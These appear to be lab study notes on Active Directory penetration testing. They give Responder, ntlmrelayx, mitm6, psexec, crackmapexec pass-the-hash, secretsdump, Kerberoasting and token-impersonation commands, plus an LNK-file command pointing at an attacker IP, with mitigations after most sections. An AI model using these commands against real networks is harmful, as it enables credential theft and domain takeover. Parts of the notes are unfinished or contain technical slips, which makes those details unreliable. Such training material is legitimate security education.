# Windows-Active-Directory-Hacking
> Study notes / lab guide — educational use and authorized testing only.  
> Reference: TCM Academy.

---

## Table of contents
- [Overview](#overview)
- [Lab setup](#lab-setup)
- [Initial attack vectors](#initial-attack-vectors)
  - [LLMNR Poisoning](#llmnr-poisoning)
  - [SMB Relay](#smb-relay)
  - [IPV6 / mitm6](#ipv6--mitm6)
  - [Passback attacks](#passback-attacks)
- [Gaining shells / lateral movement](#gaining-shells--lateral-movement)
- [Post-compromise enumeration](#post-compromise-enumeration)
  - [ldapdomaindump](#ldapdomaindump)
  - [BloodHound / PlumHound / PingCastle](#bloodhound--plumhound--pingcastle)
- [Post-compromise attacks & persistence](#post-compromise-attacks--persistence)
  - [Pass-the-Hash / Pass-the-Password](#pass-the-hash--pass-the-password)
  - [Kerberoasting](#kerberoasting)
  - [Token impersonation (meterpreter/incognito)](#token-impersonation-meterpreterincognito)
  - [LNK file attacks](#lnk-file-attacks)
  - [GPP / cPassword](#gpp--cpassword)
- [Domain compromise: NTDS & Golden Tickets](#domain-compromise-ntds--golden-tickets)
- [Mitigations summary](#mitigations-summary)
- [Responsible use & license](#responsible-use--license)

---

## Overview
Concise, lab-oriented notes about offensive techniques against Windows Active Directory environments. Intended for authorized labs and learning only.

---

## Lab setup
- Minimal lab: 1 Windows Server (Domain Controller — e.g., Windows Server 2022) and two Windows 10/11 clients.
- Rename the DC for your lab (example used in notes: `UNCLE-DC`).
- Promote the server to a Domain Controller by installing **Active Directory Domain Services**.
- Example forest name used in these notes: `FKEYS.local`.
- Install **Active Directory Certificate Services** if you plan to experiment with certificate-based attacks later.


---

## Initial attack vectors

### LLMNR Poisoning
# Summary: LLMNR / NetBIOS Poisoning → NTLM Capture

## What happens
- When DNS fails, Windows falls back to **LLMNR/NetBIOS** to resolve hostnames.  
- These protocols are unauthenticated, so **any host on the local network can reply**.  
- An attacker can answer the query, making the victim connect to them instead of the real server.  
- The victim then tries to authenticate (usually with **NTLM**).  
- NTLM uses a **challenge/response** exchange:  
  - The attacker sends a random challenge.  
  - The victim responds with a value derived from their credentials.  
- The attacker now has the **NTLM challenge/response pair** (“hash”), which can sometimes be replayed or attacked offline.  

---

## Why this works
- Windows trusts unauthenticated LLMNR/NetBIOS replies.  
- NTLM does not mutually verify the server, so a fake server can request authentication.  
- Legacy defaults keep these protocols enabled in many environments.  

---

## Defenses
- Disable **LLMNR** (Via Group Policy) and **NetBIOS** if not needed.  
- Reduce or block **NTLM** usage; prefer **Kerberos**.  
- Enforce **SMB signing** and LDAP signing/channel binding.  
- Use **unique local admin passwords** (LAPS/PAM).  
- Monitor for **suspicious LLMNR/NetBIOS responses** and unusual **NTLM authentication attempts**.  

---

## Walkthrough

 Run `sudo responder -I eth0 -ldwPv`. Here, Responder runs on the eth0 interface and (based on the flags used) will: bind to that interface, enable several responder modules (including WPAD), run in verbose mode, and log/capture authentication attempts (NTLM hashes) from hosts on the network. Responder will reply to name-resolution broadcasts (LLMNR/NetBIOS/mDNS) and serve rogue HTTP/SMB/etc. endpoints to collect credentials on the attacker machine. Then on the victim system, we can simulate an event occuring to capture the hash.
 
The hash of the victim is then captured on responder


<img width="696" height="197" alt="image" src="https://github.com/user-attachments/assets/9d0d67af-20d0-4068-b26c-d3cc71c62a3b" />

We can then crack the Hash using hashcat. `hashcash -m 5600 hashes.txt /path/to/wordlist/ `

<img width="1877" height="390" alt="image" src="https://github.com/user-attachments/assets/da11dacb-30ec-435e-963f-008ea1ae7db7" />

### SMB Relay Attacks

- Instead of capturing the hash with the responder tool, we can relay the hash via smb and gain access to a machine.An SMB relay attack lets an attacker take an authentication attempt from one machine and forward (relay) it to another machine. If the forwarded credentials are accepted, the attacker can act as that user on the second machine — often without ever cracking the password.

## Minimal requirements for success

- SMB signing is not enforced on the target machine (unsigned SMB makes relaying possible).
- The relayed account must have sufficient privileges on the target (e.g., an administrator) — otherwise the attacker’s access will be limited.

## Walkthrough 
- Open `/etc/responder/Responder.conf`.
- Turn off the `SMB` and `HTTP` responder modules (set them to `False` or comment them out).

- Why: this prevents Responder from answering SMB and HTTP requests itself — you’re disabling the built-in SMB/HTTP services so you can use a dedicated relay tool instead.

##Find targets where SMB signing is not enforced (Nmap)
- Scan your target IP(s) or range to find machines that don’t enforce SMB signing:
     `nmap --script=smb2-security-mode.nse -p445 <ip-or-range>`
- What to look for (simple): the script shows whether message signing is required or not.
- If the script reports signing not required or disabled, that host is vulnerable to relay attacks (i.e., you can try relaying to it).
- Use these vulnerable hosts to build `target.txt` (one IP per line).

## Start Responder (listening for name-resolution queries)
- Run: `sudo responder -I eth0 -ldwPv`
- What this does: binds Responder to the eth0 interface and makes it listen for name-resolution broadcasts (LLMNR/NetBIOS/etc.). It will still capture name queries and WPAD attempts and print verbose activity.
- Why: Responder will continue to attract/collect authentication attempts from victims (e.g., when they try to resolve a hostname) but because SMB/HTTP were disabled in the config, Responder won’t answer with its own SMB/HTTP servers.

## Start the relay service (forward captured auth to targets)
- run `impacket-ntlmrelayx -tf target.txt --smb2support`
- What this does: forwards captured NTLM authentication attempts to hosts listed in target.txt. `--smb2support` enables SMB2 target support.

## Trigger the event from the victim
- From the victim Windows PC, cause a lookup or connection to the attacker’s IP (examples: open `\\attacker-ip\share`, request `http://wpad/`, or click a short hostname link).

- What happens: the victim authenticates, Responder captures the handshake and hands it to ntlmrelayx, which forwards it to the hosts in target.txt. If a target accepts the relayed credentials and they have sufficient privileges, you gain access as that user
  <img width="802" height="473" alt="image" src="https://github.com/user-attachments/assets/5f7b7208-57e1-45fe-bdd4-6aa267a79dc0" />

## SMB relay attacks mitigation
- enable smb signing on all devices
- disable NTLM authentication
- account tiering
- Local admin restriction

### IPV6 Attacks (DNS takeover Via IPV6)
- What it is:
An attacker uses IPv6 network messages to convince Windows hosts to use the attacker as their DNS/route, so the attacker can make those hosts resolve internal names to the attacker and capture/relay authentication attempts (LDAP/SMB) to a Domain Controller.

**How it works:**
- Attacker advertises itself on the local network as an IPv6 router/DNS server (this is the “mitm6” step).
- Windows clients accept that advertisement, start using the attacker for IPv6 DNS and name resolution.
- When a client resolves or contacts an internal service name (e.g., for domain services), it ends up talking to the attacker.
- The attacker captures the authentication attempt (NTLM handshake) and relays it to a target (usually the Domain Controller) using a tool like ntlmrelayx. If the relay is accepted, the attacker can gain privileged access.

**Tools used - mitm6, ntlmrelayx**
`mitm6 -d fkeys.local`
What it does: tells mitm6 to advertise the IPv6 network for the domain `fkeys.local`.
- mitm6 will send IPv6 Router Advertisements and act as an IPv6 DNS responder for the local network. As a result, many Windows clients will pick up an IPv6 address/gateway/DNS pointing at the attacker and start asking that attacker to resolve internal names
<img width="635" height="89" alt="image" src="https://github.com/user-attachments/assets/7a25c347-297c-4ba8-8a10-7e311536848e" />

before you run the previous command, run this command on your other terminal:

`ntlmrelayx.py -6 -t ldaps://IP_address_of_DC -wh anything.fkeys.local -l lootbox`
**What the command does**
`-6` — operate using IPv6 (listen for and handle IPv6-based auth attempts).
`-t ldaps://IP_address_of_DC` — relay captured authentication attempts to the Domain Controller over LDAPS (secure LDAP) at that IP. In other words: when a client authenticates to the attacker, ntlmrelayx will immediately try the same credentials against the specified LDAPS service on the DC.
`-wh anything.fkeys.local` — serves a WPAD file that sets the proxy to anything.fkeys.local, causing clients that request wpad.dat to try authenticating to that host.
`-l lootbox` — store logs/output (captured sessions, shells, or files) in the lootbox folder so you can examine results later.

- Then we wait for an event to happen. but for simulation purpose, we can trigger a restart event from the machine on the network. as soon as we restart the a machine on the network, ntlmrelayx captures it.
<img width="629" height="93" alt="image" src="https://github.com/user-attachments/assets/485e615d-17d3-4e3d-a86a-505294d81e7a" />
- On navigating to "lootbox" folder created, we get alot more information. This is possible because of ldapdomain dump that comes embedded with ntlmrelayx
<img width="1071" height="380" alt="image" src="https://github.com/user-attachments/assets/be47416c-929a-4f16-bf71-11ae86868a9e" />

- But to take things further, if a domain admin user logins, ntlmrelayx will also capture it. 
<img width="647" height="389" alt="image" src="https://github.com/user-attachments/assets/943f410c-e694-4859-a094-97b03d4f101a" />
ntlmrelayx then creates a new user. 



# Windows-Active-Directory-Hacking
The repo contains information on how to hack a windows active directory. REFERENCE: TCM ACADEMY
Active Directory Overview
Physical Active directory components ( explain well without complicating things )
Logical active directory component (explain well without complicating things)
Requirements - One windows server(Windows 2022, two windows 10 Machines)
Setting up the Windows server,
Make sure you rename the windows server (in my case, UNCLE-DC)
promote the windows server to a domain controller by installing,  Active Directory Domain Services from the server manager, you can name your forest as anything but in my case i named it FKEYS.local
also make sure to install Active directory certificate services for other attacks that will considered for other attacks later






Different ways of gaining shell access
1. Throught metaspolit. There is a module called psexec
This is very noisy and can get picked up in live environment
<img width="1064" height="559" alt="image" src="https://github.com/user-attachments/assets/9c2df193-83b6-4d08-808d-0a5a9a93cfc6" />
Set the rhosts, SMBDomain, SMBPass, & SMBUser with the information gotten from earlier atttacks
We have gotten a shell
<img width="877" height="171" alt="image" src="https://github.com/user-attachments/assets/c0ce4592-70f3-41f4-a89e-4838116233f3" />

1b. you can also use the sam hash that was gotten from ntlmrelay.py to gain shell. Here, you are gaining shell as in administrator. To do this, You meed to set the SMBUser to administrator. you can also remove the SMBDomain that was previously set as it is not needed. we are loggin locally as in admin. Then finally set eh SMBPass withe the admin sam hashes
<img width="917" height="201" alt="image" src="https://github.com/user-attachments/assets/781b0459-7d41-409b-a135-9d77cc64f8a3" />



2. The use of psexec.py tool
   psexec.py DOMAIN/user:@ip-address
<img width="577" height="262" alt="image" src="https://github.com/user-attachments/assets/378a98e9-2e49-4356-b36b-85bbf91b355a" />

<img width="1004" height="255" alt="image" src="https://github.com/user-attachments/assets/d8bb87ce-031d-4c61-900b-93febda1acb3" />

3. IPV6 Attacks (DNS takeover Via IPV6)
 
Mitigation strategies for IPV6 attacks
IPv6 poisoning abuses the fact that Windows queries for an IPv6 address even in IPv4-only environments. If you do not use IPv6 internally, the safest way to prevent mitm6 is to block DHCPv6 traffic and incoming router advertisements in Windows Firewall via Group Policy. Disabling IPv6 entirely may have unwanted side effects. Setting the following predefined rules to Block instead of Allow prevents the attack from working:
(Inbound) Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6-In)
• (Inbound) Core Networking - Router Advertisement (ICMPv6-In)
(Outbound) Core Networking - Dynamic Host Configuration
Protocol for IPv6(DHCPV6- Out)
If WAD is not in use internally, disable it via Group Policy and by disabling the WinHttpAutoProxySvc service.
Relaying to LDAP and LDAPS can only be mitigated by enabling both LDAP signing and LDAP channel binding.
Consider Administrative users to the Protected Users group or marking them as Account is sensitive and cannot be delegated, which will prevent any impersonation of that user via delegation.

4. Passback attacks

POST-COMPROMISE ACTIVE DIRECTORY ENUMERATION(WHAT HAPPENS AFTER GETTING A VALID ACCOUNT)
we enumeratee

A. Domain Enumeration with ldapdomaindump
   <img width="808" height="276" alt="image" src="https://github.com/user-attachments/assets/f0f4b791-de66-4f0c-a59a-4b1aaceb7e10" />
command: ldapdomaindump ldaps://ip_addresof_DC -u 'Domanin\User' -p 'passwd'
B. Domain Enumneration with Bloodhound
to run an injester i.e so that we will be able to use the output and load it up on the bloodhound application, you can use the command:
   bloodhound-python -d <domain> -u <user> -p <password> -ns <ip_addres_of_DC> -c all 
   <img width="719" height="345" alt="image" src="https://github.com/user-attachments/assets/f71c1910-d78a-463b-b9c2-3fdb22b8b543" />
   <img width="691" height="88" alt="image" src="https://github.com/user-attachments/assets/6d3794d4-daa1-4d21-b394-6e1292869af9" />
 we can upload the json files into bloodhound for a more interactive analysis
    <img width="1906" height="889" alt="image" src="https://github.com/user-attachments/assets/9d1d6714-08d0-43c1-bcf6-d5538269c77c" />


C. Domain Enumeration with Plumhound
same as other enumeration tools
you can run the command 
   PlumHound.py --easy -p <passwd_of_neo4j>
   this command is used to test database connectiuon, it also returns Domain users to stdout
   <img width="691" height="543" alt="image" src="https://github.com/user-attachments/assets/8baa0222-d9e7-47b0-a1e6-9d3a6d069a85" />

PlumHound.py -x tasks/default.tasks -p neo4j1(what it does)


   <img width="1626" height="966" alt="Screenshot 2025-09-21 205422" src="https://github.com/user-attachments/assets/074e266f-39bb-4f8a-ad39-b5c98cc11fa2" /> 
     
D. Domain Enumeration with Pingcastle


POST COMPROMISE ATTACKS(here, we already have a valid account, what can we do with that ?
a. pass the password/ pass the hash attack(pass attacks)
if we crack a password and/or dump the SAM hashes, we can leverage both for lateral movemnt in networks
tool used - crackmapexec 
cmd- crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <password>
   <img width="1334" height="118" alt="image" src="https://github.com/user-attachments/assets/77fa776b-f988-44cd-bd32-0c11108db56d" />

we can also use hashes(NTLMv1). this is what is refered to as pass the the hash attack
cmd - crackmapexec -smb <ip/CIDR> -u administrator -H <ntlm_hash> --local-auth

   <img width="1345" height="138" alt="image" src="https://github.com/user-attachments/assets/c24d7d97-72a4-43b7-a94d-0b8a77fc5945" />
You actually do not need to crack the hash, just pass it around

you can also do --sam flag to dump the sam hashes.

   <img width="1266" height="343" alt="image" src="https://github.com/user-attachments/assets/fa252dbe-ceb8-435d-8603-77380db3c703" />


you can also do --shares to enumerate shares permissions.

   <img width="1249" height="335" alt="image" src="https://github.com/user-attachments/assets/ebf6b291-1c53-40f3-8005-037e9aa229ef" />


crackmapexec smb -L

<img width="1540" height="593" alt="image" src="https://github.com/user-attachments/assets/820248c6-d5ed-4b2a-a7e5-6bb541ca1ed1" />


DUMPING and CRACKING HASHES
this can be achieved with the use of secretsdump
cmd: impacket-secretsdump <domain>\<user>:'Password'@<ip-address>
   <img width="1211" height="632" alt="image" src="https://github.com/user-attachments/assets/9328fd5b-74ac-47b9-b3db-a9ff50eb7791" />

   this tool can dump alot of information. sam hashes, lsa, DCC2, LSA Secrets, ability to see password in cleartext,wdigest.( 

you also use hashes with secretsdumps command
cmd: impacket-secretdump administrator:@<ip_address> -hashes shjdfjhjsdfjksf

   <img width="1153" height="634" alt="image" src="https://github.com/user-attachments/assets/b98a3497-4503-454d-a095-a7688b4347f6" />

so imagine we have llmnr -> get user hash -> cracked hashes -> spray the password -> found new login -> secretdump the logins - > local admin hashes - > respray the network with local accounts

you can also crack hashes. You need NT portion of the hash when you wanna crack the hash. 

Pass the hash / Pass the password Mitigation
 Limit account re-use:
• Avoid re-using local admin password
• Disable Guest and Administrator accounts
• Limit who is a local administrator (least privilege)
• Utilize strong passwords:
• The longer the better (>14 characters)
• Avoid using common words
• I like long sentences
• Privilege Access Management (PAM):
• Check out/in sensitive accounts when needed
• Automatically rotate passwords on check out and check
• Limits pass attacks as hash/password is strong and constantly rotated

b. Kerberoasting attacks
This attack takes advantage of service accounts(explain better)
   <img width="962" height="668" alt="image" src="https://github.com/user-attachments/assets/2245384c-ca81-4237-a8b7-64bc1082709a" />
Tool used: GetuserSPNS
cmd: impacket-GetUserSPNs FKEYS.local/bjames:Password! -dc-ip 192.168.182.139 -request
the command above requests for a ticket granting ticket(tgt). Just think of it this way, if you have if a compromised domain credential, you can request for a ticket granting ticket
   <img width="895" height="374" alt="image" src="https://github.com/user-attachments/assets/ccb90c8e-47b1-4f5e-8e06-12909809244c" />

we can the crack the ticket using hashcat
hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt

mitigation strategies for kerberoasting attacks
1. Strong Passwords
2. Least privilege

c. Token Impersonation attacks
What are tokens?

• Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file.
Think cookies for computers.
Two types:

• Delegate - Created for logging into a machine or using Remote Desktop
• Impersonate - "non-interactive" such as attaching a network drive or a domain logon script

To perform the Token impersonation attack, we can make use of metasploit
first, we gain a shell (meterpreter shell), from the compromised credentials.
after we gain the meterpreter shell, we then load up the incognito extension. 
   <img width="894" height="205" alt="image" src="https://github.com/user-attachments/assets/f7a75f5e-ae70-4aed-89a8-3ae89d62f7a8" />

we can list tokens with the command: list_tokens -u

   <img width="474" height="182" alt="image" src="https://github.com/user-attachments/assets/0997b78d-99ed-4c5c-8373-f01d4aca3499" />

To impersonate the user or accoount we see when we run the list_token command,
we can run the command: impersonate_token domain\\user
   <img width="380" height="52" alt="image" src="https://github.com/user-attachments/assets/41cc23c5-091b-44a8-a661-0c2e31613e39" />
   Now, we have successfully impersonated the user

if an admin user also logins into the machine we impersonated,  we will also be able to impersonate the admin user

   <img width="473" height="504" alt="image" src="https://github.com/user-attachments/assets/517c02fd-fb38-47d5-91c4-64c94315c96a" />
   Here we have successfully impersonate the admin

we can take it a step further to add a new user into the domain admin group as seen in the picture below:

   <img width="684" height="206" alt="image" src="https://github.com/user-attachments/assets/abc32356-8326-41e7-aed7-cc93b42f4fd5" />

Token Impersonation mitigation strategies
a. limit user/group token creation
b. account tiering
c. local admin restriction

d. LNK File Attacks
LNK file attacks involve the malicious use of Windows shortcut files to execute harmful commands or deliver payloads when opened by a user.

say for example we have access to a file share. we can dump a malicious file into it. 

   <img width="640" height="145" alt="image" src="https://github.com/user-attachments/assets/9fa40aa7-7edd-41ad-a8f2-7372db5a9767" />
if the file created gets dumped into the file share and a user visits, we can capture the user hash with responder.

   <img width="814" height="618" alt="image" src="https://github.com/user-attachments/assets/d6992011-ce96-449f-8b0d-24584153d2f4" />

   <img width="972" height="202" alt="image" src="https://github.com/user-attachments/assets/276281f8-3a6a-495a-acb7-2e83c748e3ad" />

you can also automate the process of creating the malicious lnk file and dumping it into the file share using the command: netexec smb <ip_address_of_domain> -d domain.local -u user -p Password -M slinky -o NAME=test SERVER=<attacker_Ip address>

e. GPP attacks AKA  cPassword attacks (explain that it mean)

Post Compromise attack strategy
 we have an account, now what?
 * search the quick wins
   Kerberoasting
   secretdump
   pass the hash/pass the password
* No quick wins Dig deep!
     Enumerate( Bloodhound,)
     where does your account have access
     check for old vulnerabilities
* Think outside the box

We hvae compromised the Domain controller, now what is next??
WE OWN THE DOMAIN
NOW WHAT?
Preide as much value to the client as possible
Put your blinders on and do it again
Dump the NTDS.dit and crack passwords
• Enumerate shares for sensitive information
Persistence can be important
• What happens if our DA access is lost?
• Creating a DA account can be useful
(DO NOT FORGET TO DELETE IT)
• Creating a Golden Ticket can be useful, too.
Do a little dance, probably

a. Dumping the NTDS.dit
it is a database used to store Active directory data. This data includes: user info, group information, security descriptors, password hashes


   <img width="773" height="284" alt="image" src="https://github.com/user-attachments/assets/e9f9027c-f59f-4437-b95d-a908aa20c7a1" />

We can crack the hash using Hashcat

b. Golden ticket attacks
what is it?  when we compromise the krbrgt account, we own the domain
we can request access to any resource or system on the domain. with the golden ticket, we have complete access to every machine.

   
   
   









